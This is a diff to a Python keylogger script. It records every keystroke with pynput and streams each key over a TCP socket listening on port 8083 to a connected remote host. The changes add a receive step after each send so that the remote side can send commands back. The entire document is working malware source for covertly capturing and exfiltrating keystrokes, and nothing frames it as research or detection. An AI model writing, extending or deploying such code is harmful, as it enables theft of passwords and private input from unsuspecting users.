@@ -1,7 +1,6 @@
 import platform,os,socket
-from anyio import wait_socket_readable
 from pynput import keyboard
-from pynput.keyboard import Listener , Key
+from pynput.keyboard import Key
 
 def C_server(ip,port):
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Creating TCP-Ipv4 socket 
@@ -32,8 +31,9 @@ def Sender(remote_host,data):
         return True
     except Exception as e : # error hundling 
         print(f'Error While Sending :{e} ')# to be removed
+        exit()
 
-def receiver(remote_host):
+def receiver(remote_host):   
     cmd = remote_host.recv(2048)
     if len(cmd.decode()) != 0 and cmd.decode() == 'exit': # if it's a echap key 
         print("here is the CMD : ",cmd.decode())
@@ -45,12 +45,15 @@ def on_press(key):
     if type(key) != type(Key.esc): # If It's Not A Special key
         print(f" pressed : {pr_key} \n") # to be removed
         Sender(remote_host,pr_key) # sending informations
+        receiver(remote_host)
     if key == Key.enter: # If It's A Special key ( Enter Key)
         print(f" pressed : {pr_key} \n")# to be removed
         Sender(remote_host,' \n ')   # send a '\n' for better formatting
+        receiver(remote_host)
     if type(key) == type(Key.esc): # If It's A Special key
         print(f" pressed : {pr_key} \n")# to be removed
-        Sender(remote_host,' '+pr_key+' ') # for better formatting  
+        Sender(remote_host,' '+pr_key+' ') # for better formatting 
+        receiver(remote_host) 
     return True    
 
 def on_release(key):
@@ -66,5 +69,5 @@ def wait_for_user_input():
 
 remote_host = conn_hundler(C_server('0.0.0.0',8083)) # to be used in on_press func 
 
-print(wait_for_user_input()) # main
 
+print(wait_for_user_input()) # main
